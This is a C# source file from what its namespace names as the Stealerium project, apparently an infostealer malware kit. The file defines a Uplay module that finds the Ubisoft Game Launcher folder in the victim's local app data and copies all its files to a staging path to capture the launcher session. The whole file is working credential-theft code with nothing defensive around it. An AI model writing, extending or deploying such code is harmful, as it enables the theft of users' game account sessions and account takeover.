using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Gaming;

internal sealed class Uplay
{
	private static readonly string Path = global::System.IO.Path.Combine(Paths.Lappdata, "Ubisoft Game Launcher");

	public static bool GetUplaySession(string sSavePath)
	{
		if (!Directory.Exists(Path))
		{
			return Logging.Log("Uplay >> Session not found");
		}
		try
		{
			Directory.CreateDirectory(sSavePath);
			string[] files = Directory.GetFiles(Path);
			foreach (string text in files)
			{
				File.Copy(text, global::System.IO.Path.Combine(sSavePath, global::System.IO.Path.GetFileName(text)));
			}
			Counter.Uplay = true;
		}
		catch (Exception ex)
		{
			return Logging.Log("Uplay >> Error\n" + ex, ret: false);
		}
		return true;
	}
}
